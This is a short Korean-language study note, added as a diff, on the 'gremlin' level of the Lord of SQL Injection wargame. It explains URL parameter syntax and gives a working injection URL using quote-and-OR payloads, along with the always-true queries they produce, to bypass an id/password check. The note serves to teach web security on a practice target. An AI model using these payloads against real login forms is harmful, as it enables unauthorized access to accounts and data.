@@ -1,0 +1,21 @@
+﻿Lodr Of Sql Injection gremlin 
+
+? 기호가 PHP 에서 URL과 파라미터를 구분
+
+-> 입력해줄 때 ? 기호로 변수(parameter)를 받기 시작하고
+
+다음 변수를 받으려면 & 기호 사용 
+
+http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php
+query : select id from prob_gremlin where id='' and pw=''
+
+
+http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=1'or'1&pw=1'or  (물론 다르게 변하긴 한다)
+
+
+query : select id from prob_gremlin where id='1'or'1' and pw='1'or'1'
+
+
+query : select id from prob_gremlin where id='1' and pw='1'or'1'
+
+도 가능하다!!
